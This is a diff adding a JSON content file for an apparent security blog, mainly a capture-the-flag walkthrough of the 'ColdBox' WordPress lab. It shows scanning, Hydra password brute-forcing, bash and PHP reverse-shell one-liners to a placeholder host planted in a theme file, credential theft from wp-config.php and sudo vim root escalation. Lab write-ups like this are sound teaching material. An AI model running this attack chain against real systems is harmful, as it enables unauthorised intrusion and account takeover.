@@ -1,0 +1,345 @@
+[
+  {
+    "id": 1,
+    "slug": "cold-box",
+    "title": "ColdBox: Easy",
+    "category": "walkthrough",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Initial Access"
+      },
+      {
+        "type": "paragraph",
+        "id": "nmap-intro",
+        "text": "We start by scanning the target with Nmap."
+      },
+      {
+        "type": "code_block",
+        "id": "nmap-command",
+        "language": "bash",
+        "code": "nmap -p- -T4 -A -v 10.49.143.251"
+      },
+      {
+        "type": "image",
+        "id": "nmap-scan-screenshot",
+        "src": "/assets/walkthroughs/chill-hack/nmap-result.png",
+        "alt": "Nmap scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "As we can see, we found two ports: `http` and `ssh`. Since `ssh` requires credentials, we will leave it for now and focus on `http`."
+      },
+      {
+        "type": "section_heading",
+        "id": "exploring-website",
+        "text": "Further Enumeration"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-enumeration",
+        "text": "Then I started to dive deeper by exploring the website and performing directory searching."
+      },
+      {
+        "type": "code_block",
+        "id": "ffuf-command",
+        "language": "bash",
+        "code": "ffuf -u http://10.49.156.252/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+      },
+      {
+        "type": "image",
+        "id": "ffuf-scan-screenshot",
+        "src": "/assets/walkthroughs/chill-hack/directory-searching.png",
+        "alt": "Directory scan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "There, I saw many directories, but only one was worth checking: `secret`. So I decided to take a look at it, and we also noticed that it is a WordPress site."
+      },
+      {
+        "type": "image",
+        "id": "website-enumeration",
+        "src": "/assets/walkthroughs/chill-hack/website-enumeration.png",
+        "alt": "Website enumeration"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "At this stage, we saw three usernames. Now we just need a password."
+      },
+      {
+        "type": "section_heading",
+        "id": "wp-scan",
+        "text": "WordPress Scan"
+      },
+      {
+        "type": "paragraph",
+        "id": "wp-scan",
+        "text": "As we already know it is a WordPress website, we will begin by exploring it with WPScan."
+      },
+      {
+        "type": "code_block",
+        "id": "wp-command",
+        "language": "bash",
+        "code": "wpscan --url http://10.49.172.12 -e ap,at,u"
+      },
+      {
+        "type": "image",
+        "id": "wp-scan-screenshot",
+        "src": "/assets/walkthroughs/chill-hack/wp-scan.png",
+        "alt": "WPScan result"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Here, we can see multiple users: `hugo`, `c0ldd`, `philip`, and `the cold in person`. We will start with the most prominent ones, `hugo` and `c0ldd`, because we saw these usernames when we visited the website."
+      },
+      {
+        "type": "section_heading",
+        "id": "password-bruteforcing",
+        "text": "Password Bruteforcing with Hydra"
+      },
+      {
+        "type": "paragraph",
+        "id": "password-bruteforcing",
+        "text": "First, we will start with `hugo`."
+      },
+      {
+        "type": "code_block",
+        "id": "hydra-command",
+        "language": "bash",
+        "code": "hydra -l hugo -P /usr/share/wordlists/rockyou.txt 10.49.178.122 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'"
+      },
+      {
+        "type": "paragraph",
+        "id": "password-bruteforcing",
+        "text": "After waiting for a couple of hours and getting nothing, I decided to switch to the next user, which is `c0ldd`."
+      },
+      {
+        "type": "code_block",
+        "id": "hydra-command",
+        "language": "bash",
+        "code": "hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt 10.49.178.122 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'"
+      },
+      {
+        "type": "image",
+        "id": "password-found",
+        "src": "/assets/walkthroughs/chill-hack/password.png",
+        "alt": "Password found"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "With `c0ldd`, I found the password. Now we will use it to log in."
+      },
+      {
+        "type": "section_heading",
+        "id": "post-login",
+        "text": "Post-Login Enumeration"
+      },
+      {
+        "type": "paragraph",
+        "id": "post-login",
+        "text": "We will start by exploring the WordPress website after logging in. While exploring, I realized we need to get a shell by uploading a malicious payload. I used a reverse shell generator to generate a payload. You can use a one-liner reverse shell or a Pentest Monkey shell script—it’s up to you. I needed to be quick, so I used a one-liner reverse shell."
+      },
+      {
+        "type": "code_block",
+        "id": "reverse-shell-command",
+        "language": "bash",
+        "code": "sh -i >& /dev/tcp/IP/PORT 0>&1"
+      },
+      {
+        "type": "paragraph",
+        "id": "post-login",
+        "text": "You need to add your `Local IP` and `PORT`. You can generate this command by going to this URL: https://www.revshells.com/"
+      },
+      {
+        "type": "paragraph",
+        "id": "post-login",
+        "text": "Here is the UI you will see after logging in."
+      },
+      {
+        "type": "image",
+        "id": "ui",
+        "src": "/assets/walkthroughs/chill-hack/website-overview.png",
+        "alt": "Website overview"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "I clicked the `Editor` tab, and there I saw many pages. We can choose any page to inject our payload. I chose `content-none.php`, but you can use any page you like."
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "We encountered an issue: the script generated was for Bash, but we needed a PHP script. So I asked ChatGPT, and it gave me a PHP one-liner. You should understand the difference between different types of scripts."
+      },
+      {
+        "type": "code_block",
+        "id": "reverse-shell-command",
+        "language": "bash",
+        "code": "system(\"bash -c 'bash -i >& /dev/tcp/Local IP/PORT 0>&1'\");"
+      },
+      {
+        "type": "image",
+        "id": "reverse-shell",
+        "src": "/assets/walkthroughs/chill-hack/rev-command.png",
+        "alt": "Adding reverse shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Before doing anything, you need to open your terminal and run the following command. This will open a listener."
+      },
+      {
+        "type": "code_block",
+        "id": "listener-command",
+        "language": "bash",
+        "code": "nc -lvnp 4444"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "With the listener set up, all you have to do is trigger that PHP file. In my case, I used the search PHP file, so all I had to do was type anything in the search bar, and it triggered that PHP file."
+      },
+      {
+        "type": "section_heading",
+        "id": "www-data-shell",
+        "text": "Breaking into the System"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "With that, I got a shell, but it was `www-data`, so I had to escalate privileges."
+      },
+      {
+        "type": "image",
+        "id": "www-data-shell",
+        "src": "/assets/walkthroughs/chill-hack/www-data-shell.png",
+        "alt": "Got www-data shell"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "I ran `ls` in that path and saw a `wp-config.php` file. I obtained the username and password from it, then used SSH with that user and gained a proper user shell."
+      },
+      {
+        "type": "image",
+        "id": "ssh-shell",
+        "src": "/assets/walkthroughs/chill-hack/ssh.png",
+        "alt": "Got user shell"
+      },
+      {
+        "type": "section_heading",
+        "id": "user-flag",
+        "text": "User Flag"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Then I simply ran `ls` and got the user flag by printing the `user.txt` file."
+      },
+      {
+        "type": "code_block",
+        "id": "user-flag",
+        "language": "bash",
+        "code": "User Flag: [REDACTED]"
+      },
+      {
+        "type": "section_heading",
+        "id": "escalating-privilege",
+        "text": "Privilege Escalation"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Then I needed to gain a root shell, so I decided to type the most used command ever :)"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-command",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "image",
+        "id": "sudo-command-output",
+        "src": "/assets/walkthroughs/chill-hack/sudo.png",
+        "alt": "Sudo command output"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Bingo! There, I saw that I could obtain a root shell in three ways. That means my user can run those three commands as root. I decided to try one of them and used `vim`."
+      },
+      {
+        "type": "section_heading",
+        "id": "gtfobins-root",
+        "text": "Gaining Root Access with GTFOBins"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "I went to GTFOBins and searched for `vim`, where I found the command."
+      },
+      {
+        "type": "code_block",
+        "id": "gtfobins-command",
+        "language": "bash",
+        "code": "sudo vim -c '...'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "I needed a root shell, and that command was incomplete, so all I had to do was append `:!bash`."
+      },
+      {
+        "type": "code_block",
+        "id": "gtfobins-command",
+        "language": "bash",
+        "code": "sudo vim -c ':!bash'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "When I executed this command, I got a `root` shell, and then I simply printed the flag."
+      },
+      {
+        "type": "code_block",
+        "id": "root-flag",
+        "language": "bash",
+        "code": "Root Flag: [Redacted]"
+      }
+    ],
+    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+  },
+  {
+    "id": 2,
+    "slug": "web-vulns",
+    "title": "Web Vulnerabilities",
+    "category": "notes",
+    "blocks": [
+      {
+        "type": "paragraph",
+        "id": "sqli-intro",
+        "text": "SQL injection is a common web vulnerability."
+      }
+    ]
+  },
+  {
+    "id": 3,
+    "slug": "reverse-shells",
+    "title": "Reverse Shells",
+    "category": "notes",
+    "blocks": [
+      {
+        "type": "paragraph",
+        "id": "reverse-shell-definition",
+        "text": "Reverse shells allow remote command execution on the target machine."
+      }
+    ]
+  }
+]
